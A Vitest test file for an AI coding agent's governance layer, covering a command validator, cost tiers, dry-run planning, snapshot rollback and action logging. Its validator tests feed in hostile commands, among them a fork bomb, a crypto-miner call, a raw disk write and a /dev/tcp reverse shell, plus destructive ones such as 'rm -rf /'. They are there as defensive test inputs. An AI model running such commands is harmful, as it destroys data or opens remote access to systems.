import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs/promises';
import * as path from 'path';
import * as os from 'os';
import {
  validateCommand,
  isDestructiveCommand,
  isBlockedCommand,
  QUALITY_PRESETS,
  getRecommendedModel,
  getCostMultiplier,
  DryRunManager,
  SnapshotService,
  RollbackService,
  ActionLogService,
} from '../index';

describe('Governance & Safety Net — Command Validator', () => {
  it('blocks critical malicious commands (fork bombs, crypto miners, raw disk writes)', () => {
    expect(isBlockedCommand(':(){ :|:& };:')).toBe(true);
    expect(isBlockedCommand('xmrig --donate-level 1')).toBe(true);
    expect(isBlockedCommand('echo evil > /dev/sda')).toBe(true);
    expect(isBlockedCommand('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')).toBe(true);

    const result = validateCommand(':(){ :|:& };:');
    expect(result.allowed).toBe(false);
    expect(result.riskLevel).toBe('blocked');
    expect(result.reason).toContain('BLOQUEADO');
  });

  it('marks destructive commands as requiring confirmation', () => {
    expect(isDestructiveCommand('rm -rf /')).toBe(true);
    expect(isDestructiveCommand('rm -rf *')).toBe(true);
    expect(isDestructiveCommand('git push --force origin main')).toBe(true);
    expect(isDestructiveCommand('git reset --hard HEAD~1')).toBe(true);
    expect(isDestructiveCommand('DROP TABLE users;')).toBe(true);
    expect(isDestructiveCommand('sudo apt update')).toBe(true);
    expect(isDestructiveCommand('kill -9 1234')).toBe(true);

    const result = validateCommand('rm -rf node_modules');
    expect(result.allowed).toBe(true);
    expect(result.requiresConfirmation).toBe(true);
    expect(result.riskLevel).toBe('destructive');
  });

  it('classifies safe commands without confirmation', () => {
    const safeList = ['git status', 'git log -n 5', 'ls -la', 'pwd', 'node --version', 'npm --version'];
    for (const cmd of safeList) {
      const res = validateCommand(cmd);
      expect(res.allowed).toBe(true);
      expect(res.requiresConfirmation).toBe(false);
      expect(res.riskLevel).toBe('safe');
    }
  });

  it('classifies package installs and network calls as moderate risk', () => {
    const res = validateCommand('npm install axios');
    expect(res.allowed).toBe(true);
    expect(res.requiresConfirmation).toBe(false);
    expect(res.riskLevel).toBe('moderate');
  });
});

describe('Governance & Safety Net — Quality Presets & Cost Tiers', () => {
  it('returns valid quality presets and cost multipliers', () => {
    expect(QUALITY_PRESETS['free-tier'].multiplier).toBe(0);
    expect(QUALITY_PRESETS['budget-tier'].multiplier).toBe(0.25);
    expect(QUALITY_PRESETS['standard-tier'].multiplier).toBe(1.0);
    expect(QUALITY_PRESETS['premium-tier'].multiplier).toBe(3.0);
    expect(QUALITY_PRESETS['ultra-tier'].multiplier).toBe(30.0);

    expect(getCostMultiplier('free-tier')).toBe(0);
    expect(getCostMultiplier('premium-tier')).toBe(3.0);
    expect(getRecommendedModel('free-tier')).toBe('gemini-2.5-flash');
    expect(getRecommendedModel('standard-tier')).toBe('claude-3-5-sonnet');
  });
});

describe('Governance & Safety Net — DryRunManager', () => {
  it('records planned actions and computes summaries in dry-run mode', () => {
    const dryRun = new DryRunManager();
    expect(dryRun.isDryRunEnabled).toBe(false);

    dryRun.toggleDryRun();
    expect(dryRun.isDryRunEnabled).toBe(true);

    dryRun.recordPlannedAction({
      tool: 'write_file',
      description: 'Write test file',
      target: 'src/test.ts',
      riskLevel: 'safe',
      diffPreview: '+ console.log("hello");',
    });

    dryRun.recordPlannedAction({
      tool: 'run_command',
      description: 'Run build',
      command: 'npm run build',
      riskLevel: 'moderate',
    });

    const summary = dryRun.getSummary();
    expect(summary.totalActions).toBe(2);
    expect(summary.writesPlanned).toBe(1);
    expect(summary.commandsPlanned).toBe(1);
    expect(summary.filesAffected).toContain('src/test.ts');

    dryRun.clearPlannedActions();
    expect(dryRun.getPlannedActions().length).toBe(0);
  });
});

describe('Governance & Safety Net — Snapshot & Rollback Lifecycle', () => {
  let tempDir: string;

  beforeEach(async () => {
    tempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'chronokairo-ai-gov-test-'));
  });

  afterEach(async () => {
    await fs.rm(tempDir, { recursive: true, force: true });
  });

  it('creates snapshots and restores files atomically', async () => {
    const snapService = new SnapshotService(tempDir);
    const rollbackService = new RollbackService(tempDir);

    const testFile = 'index.ts';
    const originalContent = 'export const initial = true;\n';
    await fs.writeFile(path.join(tempDir, testFile), originalContent);

    // 1. Snapshot antes da modificação
    await snapService.snapshotFile('sess-1', 1, 'Phase 1', testFile, 'modified', originalContent);

    // 2. Modifica arquivo
    await fs.writeFile(path.join(tempDir, testFile), 'export const mutated = true;\n');

    // 3. Simula criação de arquivo novo
    const createdFile = 'new-file.ts';
    await fs.writeFile(path.join(tempDir, createdFile), 'new content');
    await snapService.snapshotFile('sess-1', 1, 'Phase 1', createdFile, 'created');

    // 4. Planeja rollback
    const plan = await rollbackService.plan('sess-1', 1);
    expect(plan.filesToRestore).toContain(testFile);
    expect(plan.filesToDelete).toContain(createdFile);

    // 5. Executa rollback
    const result = await rollbackService.rollback('sess-1', 1);
    expect(result.restored).toBe(1);
    expect(result.deleted).toBe(1);
    expect(result.errors.length).toBe(0);

    // 6. Verifica restauração no disco
    const restoredContent = await fs.readFile(path.join(tempDir, testFile), 'utf-8');
    expect(restoredContent).toBe(originalContent);

    const existsNewFile = await fs.access(path.join(tempDir, createdFile)).then(() => true).catch(() => false);
    expect(existsNewFile).toBe(false);
  });
});

describe('Governance & Safety Net — ActionLogService', () => {
  let tempLogsDir: string;

  beforeEach(async () => {
    tempLogsDir = await fs.mkdtemp(path.join(os.tmpdir(), 'chronokairo-ai-log-test-'));
  });

  afterEach(async () => {
    await fs.rm(tempLogsDir, { recursive: true, force: true });
  });

  it('records and queries structured JSONL action logs', async () => {
    const logger = new ActionLogService(tempLogsDir);

    await logger.log({
      sessionId: 'sess-audit-1',
      phaseIndex: 0,
      agentRole: 'software-architect',
      toolName: 'read_file',
      input: { path: 'package.json' },
      output: '{"name": "test"}',
      result: 'success',
      durationMs: 42,
      dryRun: false,
    });

    await logger.log({
      sessionId: 'sess-audit-1',
      phaseIndex: 1,
      agentRole: 'backend-engineer',
      toolName: 'write_file',
      input: { path: 'src/api.ts' },
      output: 'Wrote 150 bytes',
      result: 'success',
      durationMs: 120,
      dryRun: false,
    });

    const entries = await logger.getBySession('sess-audit-1');
    expect(entries.length).toBe(2);
    expect(entries[0].toolName).toBe('read_file');
    expect(entries[1].toolName).toBe('write_file');

    const phase1Entries = await logger.getByPhase('sess-audit-1', 1);
    expect(phase1Entries.length).toBe(1);
    expect(phase1Entries[0].agentRole).toBe('backend-engineer');
  });
});
